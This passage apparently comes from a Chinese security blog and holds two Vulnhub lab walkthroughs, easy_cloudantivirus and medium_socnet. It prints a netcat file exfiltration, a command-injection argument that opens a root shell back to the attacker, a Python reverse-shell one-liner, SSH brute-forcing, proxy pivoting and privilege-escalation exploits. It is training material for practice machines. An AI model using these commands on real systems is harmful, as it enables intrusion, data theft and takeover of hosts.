alt="image-20220315172531160"></p><p>查看文件详细信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file database.sql</span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315172736565.png" alt="image-20220315172736565"></p><p>通过将文件从目标机传到本地,看一下数据库里有什么好东西</p><p>本地</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 5555 &gt; db.sql</span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315173119896.png" alt="image-20220315173119896"></p><p>目标机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.31.125 5555 &lt; database.sql</span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315174058726.png" alt="image-20220315174058726"></p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315174310559.png" alt="image-20220315174310559"></p><p>使用kali上的sqlite3查看db.sql文件</p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315175300495.png" alt="image-20220315175300495"></p><p>code表只有一个字段password，之前有插入4条密码，而且目标主机开了22端口，可尝爆破</p><p>查看目标主机可登录账户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd | grep /bin/bash</span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315180228062.png" alt="image-20220315180228062"></p><p>三个账户四条密码，做个字典跑一下</p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315180617583.png" alt="image-20220315180617583"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P password.txt ssh://192.168.31.14</span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315181043082.png" alt="image-20220315181043082"></p><p>没有成功，那就回到nc串联，想办法提权</p><p>找一下suid</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315181716791.png" alt="image-20220315181716791"></p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315181743441.png" alt="image-20220315181743441"></p><p>update_cloudav是由update_cloudav.c编译得到，文件所有这是root，u+s  文件运行的时候会以文件所有者的权限运行，也就是root权限</p><p>查看update_cloudav文件</p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315182625865.png" alt="image-20220315182625865"></p><p>随便传了个参数</p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315183135386.png" alt="image-20220315183135386"></p><p>再来nc串联</p><p>本地监听</p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315204008763.png" alt="image-20220315204008763"></p><p>目标机执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./update_cloudav &quot;aa | nc 192.168.31.125 23456 | /bin/bash | nc 192.168.31.125 65432&quot;</span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315204049352.png" alt="image-20220315204049352"></p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315203819223.png" alt="image-20220315203819223"></p><p>彩蛋</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">扫目录</span><br><span class="line">dirsearch -u http://192.168.31.14:8080/ </span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315204312378.png" alt="image-20220315204312378"></p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315204344414.png" alt="image-20220315204344414" style="zoom: 50%;"><p>大概意思是进入后台，运行服务器就可以获得PIN</p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315211236563.png" alt="image-20220315211236563"></p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315211458138.png" alt="image-20220315211458138"></p><p>一个交互式控制台，能执行Python代码</p><p>总结：</p><p>web暴力破解获取密码————scanner存在命令执行————nc串联获取shell————suid提权</p><p>sql注入绕过密码进入后台————scanner存在命令执行————Python反弹shell————suid提权</p><hr><p>菜鸡打靶，大佬勿喷。如有错误，欢迎斧正。</p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub靶机之medium_socnet</title>
      <link href="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/"/>
      <url>/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">扫描网段获取目标主机arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152358188.png" alt="image-20220313152358188"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">扫描目标主机端口及服务nmap -sS -sV -sC -p- 192.168.31.52</span><br></pre></td></tr></table></figure><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152453389.png" alt="image-20220313152453389" style="zoom:80%;"><p>目标系统为Ubuntu，开放22端口，5000端口为web服务，访问目标web</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152552693.png" alt="image-20220313152552693"></p><p>一个留言版，测试了一下，不管输入什么都会显示出来，没有利用的地方</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152611878.png" alt="image-20220313152611878"></p><p>扫一下目录        dirsearch -u <a href="http://192.168.31.52:5000/">http://192.168.31.52:5000/</a></p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152638021.png" alt="image-20220313152638021"></p><p>访问admin目录</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152652704.png" alt="image-20220313152652704"></p><p>一个代码测试框，结合前面信息搜集的结果可知使用的是python2.7，接下来就是用python2反弹shell</p><p>nc监听        nc -lvnp 123456</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152708361.png" alt="image-20220313152708361"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python代码反弹shell</span><br><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;192.168.31.125&quot;</span>,<span class="number">12345</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152818655.png" alt="image-20220313152818655"></p><p>直接root权限</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152835357.png" alt="image-20220313152835357"></p><p>这就起飞了吗？？？当然不是</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152900646.png" alt="image-20220313152900646"></p><p>ls看到Dockerfile，难道是在docker容器里，进一步排查</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/1/cgroup</span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152932507.png" alt="image-20220313152932507"></p><p>的确是在docker容器内，获取的也是docker容器shell，并不是宿主机的shell</p><p>信息搜集一波</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153000423.png" alt="image-20220313153000423"></p><p>对外ip为：192.168.31.52        内网ip为：172.17.0.3        内网是否存在其它存活主机？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">内网主机探测    for i in $(seq 1, 254); do ping -c 1 172.17.0.$i;done</span><br></pre></td></tr></table></figure><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153030619.png" alt="image-20220313153030619" style="zoom:80%;"><p>内网存活主机：172.17.0.1    172.17.0.2（已getshell）    172.17.0.3</p><p>扫描服务及端口，但外网没法访问到内网，搭建代理隧道，将getshell的172.17.0.2作为代理服务器，通过172.17.0.2去访问另外两台存活主机</p><p>使用venom搭建代理隧道</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153055250.png" alt="image-20220313153055250"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python开启web服务python2 -m SimpleHTTPServer 8888</span><br><span class="line">                        python3 -m http.server 8888</span><br><span class="line">目标主机获取文件 wget http://192.168.31.125:8888/a64</span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153145468.png" alt="image-20220313153145468"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本机监听端口./admin_linux_x64 -lport 5566</span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153206482.png" alt="image-20220313153206482"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">赋予文件执行权限chmod u+x a64</span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153230820.png" alt="image-20220313153230820"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">连接远程主机./a64 -rhost 192.168.31.125 -rport 5566 </span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153309221.png" alt="image-20220313153309221"></p><p>创建socks隧道</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153326946.png" alt="image-20220313153326946"></p><p>配置proxychains</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153340523.png" alt="image-20220313153340523"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">端口服务探测proxychains nmap -Pn -sT -sV  172.17.0.1</span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153359594.png" alt="image-20220313153359594"></p><p>也是开放22和5000端口，5000为web服务，浏览器代理访问一下</p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153425435.png" alt="image-20220313153425435" style="zoom:80%;"><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153433756.png" alt="image-20220313153433756" style="zoom:80%;"><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153445433.png" alt="image-20220313153445433" style="zoom:80%;"><p>和目标机一摸一样。再看看172.17.0.3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">端口服务探测          proxychains nmap -Pn -sT -sV  172.17.0.1</span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153543463.png" alt="image-20220313153543463"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">搜索Elasticsearch漏洞searchsploit Elasticsearch</span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153609581.png" alt="image-20220313153609581"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">路径/usr/share/exploitdb/exploits/linux/remote/36337.py</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">执行exp       proxychains python 36337.py 172.17.0.3</span><br></pre></td></tr></table></figure><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153639118.png" alt="image-20220313153639118" style="zoom:80%;"><p>获取到172.17.0.3 root权限，并且发现passwords文件夹</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153655041.png" alt="image-20220313153655041"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">破解hash     https://www.somd5.com/</span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153715317.png" alt="image-20220313153715317"></p><p>ssh远程连接宿主机            ssh <a href="mailto:&#106;&#111;&#104;&#110;&#64;&#49;&#57;&#50;&#46;&#49;&#54;&#x38;&#46;&#51;&#x31;&#x2e;&#53;&#50;">&#106;&#111;&#104;&#110;&#64;&#49;&#57;&#50;&#46;&#49;&#54;&#x38;&#46;&#51;&#x31;&#x2e;&#53;&#50;</a></p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153727980.png" alt="image-20220313153727980"></p><p>多次测试，仅john密码正确，能登录成功</p><p>Linux提权</p><p>suid提权，没可利用的命令</p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153742684.png" alt="image-20220313153742684" style="zoom:80%;"><p>sudo提权也失败</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153904073.png" alt="image-20220313153904073"></p><p>内核比较老，可尝试溢出</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153827219.png" alt="image-20220313153827219"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">搜索提权expsearchsploit linux 3.13</span><br></pre></td></tr></table></figure><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153919942.png" alt="image-20220313153919942" style="zoom:80%;"><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153942789.png" alt="image-20220313153942789" style="zoom:80%;"><p>目标机没有安装gc，只能在本机上编译好再上传到目标机，但是查看exp发现代码还是需要调用gcc编译ofs-lib.c</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153954033.png" alt="image-20220313153954033"></p><p>删除exp中的调用ofs-lib.c这部分代码，执行编译，将编译后的文件同kali上编译好的ofs-lib.so一起上传目标执行</p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313154007458.png" alt="image-20220313154007458" style="zoom:80%;"><p>编译报错，不影响</p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313154021481.png" alt="image-20220313154021481" style="zoom:80%;"><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313154047914.png" alt="image-20220313154047914"></p><p>同样使用python开启web服务</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313154104043.png" alt="image-20220313154104043"></p><p>将两个文件都移动到&#x2F;tmp目录下并赋予exp执行权限</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313154115833.png" alt="image-20220313154115833"></p><p>执行就可以获取root权限</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313154134245.png" alt="image-20220313154134245"></p><p>总结</p><p>web扫目录发现&#x2F;admin  —-&gt;  python2代码测试反弹shell  —-&gt;  获取shell发现是docker容器  —-&gt;  内网探测发现其它主机  —-&gt;  venom scks代理  —-&gt;  Elasticsearch漏洞直接getshell  —-&gt;  发现passwords文件  —-&gt;  hash破解ssh远程登录  —-&gt;  溢出提权</p><hr><p>菜鸡打靶，大佬勿喷。如有错误，欢迎斧正。</p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
